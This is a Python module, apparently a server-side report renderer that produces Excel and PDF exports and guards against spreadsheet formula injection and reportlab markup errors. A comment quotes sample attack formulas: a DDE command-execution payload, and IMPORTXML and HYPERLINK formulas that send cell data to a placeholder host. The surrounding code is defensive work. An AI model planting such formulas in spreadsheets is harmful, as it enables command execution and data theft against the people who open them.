"""Server-side report renderer — the backend twin of frontend/src/lib/export.tsx.

Both on-demand and scheduled sends generate files here so output is identical to
the browser export. A `payload` mirrors the frontend ExportPayload:

    payload = {
      "title": str,
      "subtitle": str | None,
      "filename": str,                     # base name, no extension
      "sheets": [ {
          "name": str,
          "columns": [ Column ],
          "rows": [ dict ],
      } ],
    }

A Column is a dict:
    {"header": str, "key": str}            # value = row[key]
    optional: "fn": callable(row)->value   # computed value (overrides key)
              "money": True                # format as $#,##0.00 / right-align
              "align": "right" | "left"

xlsx uses openpyxl (already a dep). pdf uses reportlab (added to requirements).
"""
import re
from io import BytesIO

# Visual parity with export.tsx: header fill #1E3A5F = rgb(30,58,95).
HEADER_RGB = (30, 58, 95)
MONEY_FMT = "$#,##0.00"


def _raw(col, row):
    """Underlying value for a cell (callable fn wins over key)."""
    fn = col.get("fn")
    if fn is not None:
        try:
            return fn(row)
        except Exception:
            return None
    return row.get(col["key"])


def _money_str(v):
    try:
        return f"${float(v or 0):,.2f}"
    except (TypeError, ValueError):
        return "$0.00"


def _display(col, row):
    v = _raw(col, row)
    if col.get("money"):
        return _money_str(v)
    return "" if v is None else str(v)


# ── CSV / Excel formula injection (H7, 2026-08-05 security audit) ────────────────────────────────
# These workbooks are EMAILED and WhatsApp'd to owners and DMs, so a payload sitting in tenant data
# travels to a human who opens it in Excel. openpyxl types any string starting with "=" as a FORMULA
# (`data_type == 'f'` → an <f> element), which is exactly the DDE/exfil vector:
#     =cmd|'/C calc'!A0        =IMPORTXML(CONCAT("http://x/",A1),"//a")     =HYPERLINK("http://x?"&A1)
# (Proven live, not assumed: see harness_export_xss_upload.py section A.)
#
# THE FIX PRESERVES THE VALUE EXACTLY. It does NOT prefix an apostrophe — openpyxl stores an
# apostrophe as a literal character (Excel's quote-prefix is a STYLE, not text), so prefixing would
# print `'-1234.56` into every report. Instead the cell is forced to a text cell
# (`data_type = 's'` → `<c t="inlineStr">`) and marked with Excel's own quotePrefix style. Displayed
# characters are byte-identical; Excel never evaluates it, and never re-evaluates it if edited.
#
# THE ANTI-REGRESSION RULE IS THE WHOLE POINT. A value that merely LOOKS dangerous but is ordinary
# business data is left completely untouched:
#   · money columns are written as real FLOATS with a number format — never strings — so they can
#     never enter this path at all;
#   · a plain numeric string ("-1234.56", "+250", "-1,234.56", "-$99.00", "-3.5%", "1e5") is a number
#     to Excel, not a formula, and is passed through unchanged;
#   · dates and phone numbers never start with "="; "+1 (555) 123-4567" IS neutralised, and still
#     displays character-for-character as typed.
_RISKY_LEAD = ("=", "+", "-", "@", "\t", "\r", "\n")

_NUMERICISH = re.compile(
    r"""^[+-]?                 # optional sign — the ONLY reason a legitimate cell starts with + or -
        \$?\s*                 # optional currency symbol ("-$1,234.56")
        (?:\d{1,3}(?:,\d{3})+|\d+)   # 1,234,567  or  1234567
        (?:\.\d+)?             # decimals
        (?:[eE][+-]?\d+)?      # scientific notation
        \s*%?$                 # optional trailing percent
    """,
    re.VERBOSE,
)


def _is_formula_risky(value) -> bool:
    """True only for a STRING that Excel/Sheets would evaluate, and that is not ordinary numeric data.
    Non-strings (int/float/Decimal/date/datetime/bool/None) can never be formulas → always False."""
    if not isinstance(value, str) or not value:
        return False
    if value[0] not in _RISKY_LEAD:
        return False
    return not _NUMERICISH.match(value.strip())


def _para(v) -> str:
    """Escape for reportlab's Paragraph mini-markup. Paragraph parses `& < >` as markup, so a store
    literally named "A & B" — or any tenant string containing `<` — makes doc.build() RAISE and the
    whole PDF send fail. Data cells were already escaped; the title, subtitle, sheet name and column
    headers were not, and all four carry tenant text. Same escape, one helper (2026-08-05)."""
    return str("" if v is None else v).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def _write_text_cell(cell, value):
    """Force `cell` to a literal TEXT cell without altering a single displayed character."""
    cell.value = value
    cell.data_type = "s"          # <c t="inlineStr"> — never <f>
    try:
        cell.quotePrefix = True   # Excel's own "this is text" marker; survives a user edit
    except Exception:
        pass                      # older openpyxl → data_type alone is already sufficient


# ── Excel ────────────────────────────────────────────────────────────────────
def build_xlsx(payload: dict) -> bytes:
    from openpyxl import Workbook
    from openpyxl.styles import Font, PatternFill, Alignment

    wb = Workbook()
    wb.remove(wb.active)  # drop the default sheet; we add our own
    header_fill = PatternFill("solid", fgColor="1E3A5F")
    header_font = Font(bold=True, color="FFFFFF")
    right = Alignment(horizontal="right")

    sheets = payload.get("sheets") or []
    if not sheets:
        sheets = [{"name": "Report", "columns": [], "rows": []}]

    for sheet in sheets:
        name = (sheet.get("name") or "Sheet")
        # Excel sheet-name rules: <=31 chars, no \/?*[]:
        for ch in "\\/?*[]:":
            name = name.replace(ch, " ")
        name = name[:31] or "Sheet"
        ws = wb.create_sheet(title=name)
        cols = sheet.get("columns") or []
        rows = sheet.get("rows") or []

        # Header row (a column header is configurable in places, so it gets the same guard)
        for ci, col in enumerate(cols, start=1):
            hdr = col.get("header") or ""
            c = ws.cell(row=1, column=ci)
            if _is_formula_risky(hdr):
                _write_text_cell(c, hdr)
            else:
                c.value = hdr
            c.fill = header_fill
            c.font = header_font

        # Data rows
        for ri, row in enumerate(rows, start=2):
            for ci, col in enumerate(cols, start=1):
                if col.get("money"):
                    # Money is a real float + number format — it can never be a formula, and this is
                    # also why the H7 guard cannot touch a single currency figure.
                    try:
                        val = float(_raw(col, row) or 0)
                    except (TypeError, ValueError):
                        val = 0.0
                    cell = ws.cell(row=ri, column=ci, value=val)
                    cell.number_format = MONEY_FMT
                    cell.alignment = right
                else:
                    v = _raw(col, row)
                    v = "" if v is None else v
                    cell = ws.cell(row=ri, column=ci)
                    if _is_formula_risky(v):
                        _write_text_cell(cell, v)   # H7: literal text, displayed value unchanged
                    else:
                        cell.value = v
                    if col.get("align") == "right":
                        cell.alignment = right

        # Column widths (mirror export.tsx heuristic)
        for ci, col in enumerate(cols, start=1):
            hdr = col.get("header") or ""
            width = max(len(hdr) + 2, 12 if col.get("money") else 16)
            ws.column_dimensions[ws.cell(row=1, column=ci).column_letter].width = width

    out = BytesIO()
    wb.save(out)
    return out.getvalue()


# ── PDF ──────────────────────────────────────────────────────────────────────
def build_pdf(payload: dict) -> bytes:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import A4, landscape
    from reportlab.lib.units import mm
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.platypus import (
        SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer, PageBreak,
    )

    buf = BytesIO()
    page_w, page_h = landscape(A4)
    margin = 12 * mm
    avail_w = page_w - 2 * margin
    doc = SimpleDocTemplate(
        buf, pagesize=landscape(A4),
        leftMargin=margin, rightMargin=margin, topMargin=margin, bottomMargin=margin,
        title=payload.get("title") or "Report",
    )
    styles = getSampleStyleSheet()
    h1 = ParagraphStyle("rh1", parent=styles["Heading1"], fontSize=15, spaceAfter=2)
    sub = ParagraphStyle("rsub", parent=styles["Normal"], fontSize=9, textColor=colors.grey, spaceAfter=8)
    h2 = ParagraphStyle("rh2", parent=styles["Heading2"], fontSize=11, spaceBefore=8, spaceAfter=4)
    cell_style = ParagraphStyle("rcell", parent=styles["Normal"], fontSize=7, leading=8)
    head_style = ParagraphStyle("rhead", parent=styles["Normal"], fontSize=7, leading=8,
                                textColor=colors.white, fontName="Helvetica-Bold")
    header_color = colors.Color(HEADER_RGB[0] / 255, HEADER_RGB[1] / 255, HEADER_RGB[2] / 255)

    story = [Paragraph(_para(payload.get("title") or "Report"), h1)]
    if payload.get("subtitle"):
        story.append(Paragraph(_para(payload["subtitle"]), sub))

    sheets = payload.get("sheets") or []
    for si, sheet in enumerate(sheets):
        cols = sheet.get("columns") or []
        rows = sheet.get("rows") or []
        if len(sheets) > 1:
            story.append(Paragraph(f"{_para(sheet.get('name') or 'Sheet')}  ({len(rows)})", h2))
        if not cols:
            continue
        if not rows:
            story.append(Paragraph("<i>No rows.</i>", cell_style))
            story.append(Spacer(1, 6))
            continue

        # Header cells as Paragraphs so long headers wrap.
        header_cells = [Paragraph(_para(c.get("header") or ""), head_style) for c in cols]
        data = [header_cells]
        for row in rows:
            line = []
            for col in cols:
                txt = _para(_display(col, row))
                line.append(Paragraph(txt, cell_style))
            data.append(line)

        # Even column widths across the available page width (always fits).
        col_w = avail_w / len(cols)
        table = Table(data, colWidths=[col_w] * len(cols), repeatRows=1)
        style = [
            ("BACKGROUND", (0, 0), (-1, 0), header_color),
            ("GRID", (0, 0), (-1, -1), 0.25, colors.Color(0.8, 0.8, 0.8)),
            ("VALIGN", (0, 0), (-1, -1), "TOP"),
            ("TOPPADDING", (0, 0), (-1, -1), 2),
            ("BOTTOMPADDING", (0, 0), (-1, -1), 2),
            ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.white, colors.Color(0.96, 0.97, 0.98)]),
        ]
        for ci, col in enumerate(cols):
            if col.get("money") or col.get("align") == "right":
                style.append(("ALIGN", (ci, 1), (ci, -1), "RIGHT"))
        table.setStyle(TableStyle(style))
        story.append(table)
        story.append(Spacer(1, 8))

    doc.build(story)
    return buf.getvalue()


def render(payload: dict, fmt: str) -> tuple[bytes, str, str]:
    """Return (bytes, filename, mime) for fmt in {'xlsx','pdf'}."""
    base = payload.get("filename") or "report"
    if fmt == "xlsx":
        return (build_xlsx(payload), f"{base}.xlsx",
                "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")
    if fmt == "pdf":
        return build_pdf(payload), f"{base}.pdf", "application/pdf"
    raise ValueError(f"unknown format {fmt!r}")
